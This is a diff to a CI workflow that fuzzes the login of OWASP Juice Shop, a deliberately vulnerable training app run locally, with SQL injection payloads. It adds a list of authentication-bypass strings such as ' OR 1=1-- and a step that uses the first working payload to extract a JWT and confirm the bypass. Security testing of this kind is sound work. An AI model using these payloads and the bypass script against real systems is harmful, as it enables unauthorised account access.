@@ -14,67 +14,151 @@ jobs:
   ffuf:
     runs-on: self-hosted
     services:
-      juice:
-        image: bkimminich/juice-shop
-        ports:
-          - 3000:3000
-
+        juice:
+          image: bkimminich/juice-shop
+          ports:
+            - 3000:3000
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
       - name: Wait for service
         run: |
-          echo "Waiting for Juice Shop to start..."
           for i in $(seq 1 30); do
-            if curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/rest/user/login | grep -q "200\|401"; then
-              echo "Service is up."
+            if curl -s -o /dev/null -w '%{http_code}' http://localhost:3000/ | grep -q 200; then
+              echo "Service is up"
               break
             fi
             sleep 2
           done
-          curl -s -X POST http://localhost:3000/rest/user/login \
-            -H "Content-Type: application/json" \
-            -d '{"email":"test@test.com","password":"test"}' || true
 
-      - name: Get and prepare payloads
+      - name: Sanity check (manual SQLi probe)
         run: |
-          wget -q https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection -O sql-injection-raw.txt
-          grep -v '^#' sql-injection-raw.txt | sed '/^$/d' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' > sql-payloads.txt
-          echo "Подготовлено payload'ов: $(wc -l < sql-payloads.txt)"
-          head -n 5 sql-payloads.txt
+          curl --path-as-is -i -s -k -X POST \
+            -H 'Content-Type: application/json' \
+            --data-binary '{"email":"'"'"' or 1=1 -- -","password":"pass"}' \
+            http://localhost:3000/rest/user/login
 
-      - name: Install ffuf (prebuilt binary)
+      - name: Get payloads
         run: |
-          # Скачиваем готовый бинарник — не требуем Go на self-hosted раннере
-          FFUF_VER="v2.1.0"
-          wget -q "https://github.com/ffuf/ffuf/releases/download/${FFUF_VER}/ffuf_${FFUF_VER#v}_linux_amd64.tar.gz" -O ffuf.tar.gz
-          tar -xzf ffuf.tar.gz ffuf
-          chmod +x ffuf
-          ./ffuf -V
+          wget -O SQL-Injection.txt \
+            "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection"
+          # SQLite-specific supplement (Juice Shop's backend is SQLite,
+          # so comment style/func differences matter)
+          cat >> SQL-Injection.txt <<'EOF'
+          ' OR '1'='1
+          ' OR 1=1--
+          ' OR 1=1-- -
+          ' OR 1=1#
+          ' OR 1=1/*
+          admin'--
+          admin' --
+          admin' #
+          ' OR ''='
+          ') OR ('1'='1
+          ' OR sqlite_version()>0 -- -
+          EOF
+          # Dedup, drop empty lines
+          sort -u SQL-Injection.txt -o SQL-Injection.txt
+          sed -i '/^$/d' SQL-Injection.txt
 
-      - name: Run ffuf SQL injection fuzzing
+      - name: Install fuzzing
         run: |
-          ./ffuf -w sql-payloads.txt \
+          go install github.com/ffuf/ffuf/v2@latest
+
+      - name: Run fuzzing
+        run: |
+          $HOME/go/bin/ffuf \
+            -w SQL-Injection.txt:FUZZ \
             -u http://localhost:3000/rest/user/login \
             -X POST \
-            -H "Content-Type: application/json" \
-            -d '{"email":"FUZZ","password":"pass"}' \
+            -H 'Content-Type: application/json' \
+            -d '{"email":"FUZZ","password":"anything"}' \
             -mc 200 \
-            -fr '"message":"Invalid email or password"' \
-            -o ffuf-results.json \
+            -fc 401 \
             -of json \
-            -v || true
+            -o ffuf-results.json \
+            -r || true
 
-      - name: Get logs from Juice Shop service
+      - name: Summarize findings
         run: |
-          docker logs $(docker ps -q --filter "ancestor=bkimminich/juice-shop") > juice-logs.log 2>&1 || true
+          echo "## SQLi fuzzing results (ffuf vs juice-shop login)" >> "$GITHUB_STEP_SUMMARY"
+          if [ -s ffuf-results.json ]; then
+            jq -r '
+              .results[]?
+              | "- payload: `\(.input.FUZZ)` -> status \(.status), length \(.length)"
+            ' ffuf-results.json >> "$GITHUB_STEP_SUMMARY" || echo "No matches parsed" >> "$GITHUB_STEP_SUMMARY"
+          else
+            echo "No ffuf-results.json produced — check job logs." >> "$GITHUB_STEP_SUMMARY"
+          fi
+
+      - name: Extract JWT and verify bypass
+        run: |
+          set -e
+          if [ ! -s ffuf-results.json ]; then
+            echo "No results file, skipping JWT extraction."
+            exit 0
+          fi
+
+          # Берём первый успешный payload из найденных ffuf
+          PAYLOAD=$(jq -r '.results[0]?.input.FUZZ // empty' ffuf-results.json)
+
+          if [ -z "$PAYLOAD" ]; then
+            echo "No successful payloads found by ffuf."
+            echo "### JWT extraction" >> "$GITHUB_STEP_SUMMARY"
+            echo "No successful SQLi payload found — skipping token extraction." >> "$GITHUB_STEP_SUMMARY"
+            exit 0
+          fi
+
+          echo "Using payload: $PAYLOAD"
+
+          # Собираем JSON-тело безопасно через jq, чтобы не сломать экранирование кавычек/спецсимволов
+          BODY=$(jq -n --arg email "$PAYLOAD" --arg password "anything" \
+            '{email: $email, password: $password}')
+
+          RESPONSE=$(curl -s -X POST \
+            -H 'Content-Type: application/json' \
+            --data-binary "$BODY" \
+            http://localhost:3000/rest/user/login)
+
+          echo "Login response: $RESPONSE"
+
+          TOKEN=$(echo "$RESPONSE" | jq -r '.authentication.token // empty')
+
+          if [ -z "$TOKEN" ]; then
+            echo "Could not extract JWT from response."
+            echo "### JWT extraction" >> "$GITHUB_STEP_SUMMARY"
+            echo "Payload \`$PAYLOAD\` returned 200 but no token field found in response." >> "$GITHUB_STEP_SUMMARY"
+            echo '```json' >> "$GITHUB_STEP_SUMMARY"
+            echo "$RESPONSE" >> "$GITHUB_STEP_SUMMARY"
+            echo '```' >> "$GITHUB_STEP_SUMMARY"
+            exit 0
+          fi
+
+          echo "Extracted JWT: $TOKEN"
+          echo "$TOKEN" > jwt-token.txt
+
+          # Подтверждаем обход авторизации реальным вызовом защищённого эндпоинта
+          WHOAMI=$(curl -s -H "Authorization: Bearer $TOKEN" http://localhost:3000/rest/user/whoami)
+
+          echo "### JWT extraction & auth-bypass confirmation" >> "$GITHUB_STEP_SUMMARY"
+          echo "- Payload used: \`$PAYLOAD\`" >> "$GITHUB_STEP_SUMMARY"
+          echo "- Extracted token: \`${TOKEN:0:40}...\`" >> "$GITHUB_STEP_SUMMARY"
+          echo '- `/rest/user/whoami` response:' >> "$GITHUB_STEP_SUMMARY"
+          echo '```json' >> "$GITHUB_STEP_SUMMARY"
+          echo "$WHOAMI" | jq . >> "$GITHUB_STEP_SUMMARY" 2>/dev/null || echo "$WHOAMI" >> "$GITHUB_STEP_SUMMARY"
+          echo '```' >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Get Logs from Service
+        if: always()
+        run: |
+          docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > juice-logs.log 2>&1 || true
+
 
       - name: Upload results
+        if: always()
         uses: actions/upload-artifact@v4
         with:
           name: security-reports-bundle
           path: |
             juice-logs.log
+            SQL-Injection.txt
             ffuf-results.json
-            sql-payloads.txt
+            jwt-token.txt
